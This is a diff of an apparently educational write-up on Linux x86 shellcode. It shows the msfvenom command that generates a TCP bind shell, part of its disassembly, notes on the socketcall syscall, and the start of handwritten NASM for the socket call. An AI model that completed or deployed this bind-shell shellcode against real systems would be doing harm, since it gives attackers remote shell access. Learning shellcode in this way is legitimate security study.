@@ -18,9 +18,9 @@ A bind shell is a type of shell in which the system on which the code is run bin
 
 While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: `socket`, `bind`, `listen`, `accept`, `dup2`, and execve. Each serve a purpose in creating a bind shell. Let's analyze the first function in this payload. 
 
-`msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -` produces a payload the size of 78 bytes:
+```msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -``` produces a payload the size of 78 bytes:
 
-```
+```nasm
 xor ebx,ebx  
 mul ebx  
 push ebx  
@@ -65,7 +65,40 @@ mov al,0xb
 int 0x80 ; execve
 ```
 
-The socket or SYS_SOCKETCALL is syscall number 102 or 0x66.
+The socket or SYS_SOCKETCALL is syscall number 102 or 0x66 which receives three arguements according to `man7.org/linux/man-pages/man2/socketcall.2.html`. The received arguements are `domain (selects the protocal which we want tcp)`, `type (we want SOCK_STREAM)`, and `protocol ()`
+
+Any socket in C would be built upon the skeleton below:
+```c socket_skeleton = int socket(int domain, int type, int protocol);```
+
+The manpage ip(7) further explains that a TCP socket should be created with these paramaters:
+```c tcp_socket = socket(AF_INET, SOCK_STREAM, 0);``` which would be translated to:
+```c tcp_socket = socket()```
+
+Further examples of alternate sockets include:
+```c udp_socket = socket(AF_INET, SOCK_DGRAM, 0)
+     raw_socket = socket(AF_INET, SOCK_RAW, protocol)```
+
+Let's start building our tcp bind shell.
+
+###Assembly Start
+```nasm
+global _start
+
+section .text
+_start:
+	;Begin by calling/intializing socket
+	push 0x66 ; rather than xor'ing eax, eax we can do a push 
+	pop eax   ; of the syscall socket and pop it into eax sparing us a byte (eax).
+	;Feed socket syscall it's arguements starting with domain (1 aka SYS_SOCKET) which can be referenced in /usr/include/linux/net.h.
+	push 0x1  ; same method as before to spare us a byte (ebx).
+	pop ebx	  ;
+	
+	
+	
+	
+```
+
+
 
 
 ### Create a TCP Socket
